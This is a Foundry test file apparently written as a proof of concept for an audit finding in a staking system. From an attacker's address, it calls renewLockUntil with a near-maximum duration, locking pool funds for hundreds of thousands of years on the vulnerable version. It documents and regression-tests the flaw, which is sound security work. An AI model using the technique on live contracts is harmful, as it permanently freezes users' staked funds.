// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { Staking } from "@gravity/staking/Staking.sol";
import { StakePool } from "@gravity/staking/StakePool.sol";
import { StakingConfig } from "@gravity/runtime/StakingConfig.sol";
import { Timestamp } from "@gravity/runtime/Timestamp.sol";
import { SystemAddresses } from "@gravity/foundation/SystemAddresses.sol";
import { ValidatorStatus } from "@gravity/foundation/Types.sol";

/// @notice Mock ValidatorManagement — pool treated as non-validator so withdrawals/renewals are allowed.
contract MockValidatorManagement {
    function isValidator(address) external pure returns (bool) { return false; }
    function getValidatorStatus(address) external pure returns (ValidatorStatus) {
        return ValidatorStatus.INACTIVE;
    }
}

/// @notice Mock Reconfiguration — never in progress.
contract MockReconfiguration {
    function isTransitionInProgress() external pure returns (bool) { return false; }
}

/// @title PoC for gravity-audit issue #273
/// @notice "renewLockUntil has no upper-bound cap — compromised staker key permanently locks all pool funds"
/// @dev   Semantics of forge test pass/fail for this PoC:
///        - On VULNERABLE code (tag gravity-testnet-v1.0.0, 27b22c3): test PASSES — attack succeeds,
///          lockedUntil is pushed to near uint64.max, funds effectively locked forever.
///        - On FIXED code (main, a623eab+): test FAILS — attack is blocked by MAX_LOCKUP_DURATION
///          check; renewLockUntil reverts with ExcessiveLockupDuration and the post-state assertion
///          never runs.
contract POC_273 is Test {
    Staking public staking;
    StakingConfig public stakingConfig;
    Timestamp public timestamp;

    address public attacker = makeAddr("attacker");

    uint256 constant MIN_STAKE = 1 ether;
    uint64 constant LOCKUP_DURATION = uint64(14 days) * 1_000_000;
    uint64 constant UNBONDING_DELAY = uint64(7 days) * 1_000_000;
    uint64 constant INITIAL_TIMESTAMP = 1_000_000_000_000_000;

    /// @dev StakingConfig.initialize signature drifted between commits (3 vs 4 args).
    ///      Try 4-arg first (old, 27b22c3), fall back to 3-arg (main). Each call needs its own prank
    ///      because vm.prank only applies to the next external call.
    function _initStakingConfigEither() internal {
        vm.prank(SystemAddresses.GENESIS);
        (bool ok4,) = address(stakingConfig).call(
            abi.encodeWithSignature(
                "initialize(uint256,uint64,uint64,uint256)",
                MIN_STAKE, LOCKUP_DURATION, UNBONDING_DELAY, MIN_STAKE
            )
        );
        if (ok4) return;

        vm.prank(SystemAddresses.GENESIS);
        (bool ok3,) = address(stakingConfig).call(
            abi.encodeWithSignature(
                "initialize(uint256,uint64,uint64)",
                MIN_STAKE, LOCKUP_DURATION, UNBONDING_DELAY
            )
        );
        require(ok3, "StakingConfig.initialize: neither 3-arg nor 4-arg worked");
    }

    function setUp() public {
        vm.etch(SystemAddresses.STAKE_CONFIG, address(new StakingConfig()).code);
        stakingConfig = StakingConfig(SystemAddresses.STAKE_CONFIG);

        vm.etch(SystemAddresses.TIMESTAMP, address(new Timestamp()).code);
        timestamp = Timestamp(SystemAddresses.TIMESTAMP);

        vm.etch(SystemAddresses.STAKING, address(new Staking()).code);
        staking = Staking(SystemAddresses.STAKING);

        vm.etch(SystemAddresses.VALIDATOR_MANAGER, address(new MockValidatorManagement()).code);
        vm.etch(SystemAddresses.RECONFIGURATION, address(new MockReconfiguration()).code);

        _initStakingConfigEither();

        vm.prank(SystemAddresses.BLOCK);
        timestamp.updateGlobalTime(attacker, INITIAL_TIMESTAMP);

        vm.deal(attacker, 100 ether);
    }

    /// @notice Attacker (staker) calls renewLockUntil with huge duration.
    ///         On vulnerable code, succeeds → pushes lockedUntil to near uint64.max.
    ///         On fixed code, reverts → this test fails.
    function test_attackSucceedsIfVulnerable() public {
        uint64 initialLockedUntil = INITIAL_TIMESTAMP + LOCKUP_DURATION;

        vm.prank(attacker);
        address pool = staking.createPool{ value: 10 ether }(
            attacker, attacker, attacker, attacker, initialLockedUntil
        );

        StakePool sp = StakePool(payable(pool));

        uint64 beforeLock = sp.lockedUntil();
        emit log_named_uint("BEFORE lockedUntil (micros)", beforeLock);
        assertEq(beforeLock, initialLockedUntil, "sanity: initial lockedUntil");

        // Exploit: compromised staker key pushes lockedUntil to near uint64.max.
        // Pick largest duration that does not trip the overflow guard:
        //   newLockedUntil = lockedUntil + durationMicros
        //   must have newLockedUntil > lockedUntil (no wraparound)
        uint64 hugeDuration = type(uint64).max - beforeLock - 1;

        vm.prank(attacker);
        sp.renewLockUntil(hugeDuration);

        uint64 afterLock = sp.lockedUntil();
        emit log_named_uint("AFTER  lockedUntil (micros)", afterLock);

        uint64 expected = beforeLock + hugeDuration;
        assertEq(afterLock, expected, "lockedUntil should be pushed to near uint64.max");

        // Sanity: ~584,000 years into the future — funds effectively locked forever.
        uint64 yearsFromNow = (afterLock - INITIAL_TIMESTAMP) / (1_000_000 * 86400 * 365);
        emit log_named_uint("years locked beyond current time", yearsFromNow);
        assertGt(yearsFromNow, 100_000, "attack impact: >100k years lock");
    }
}
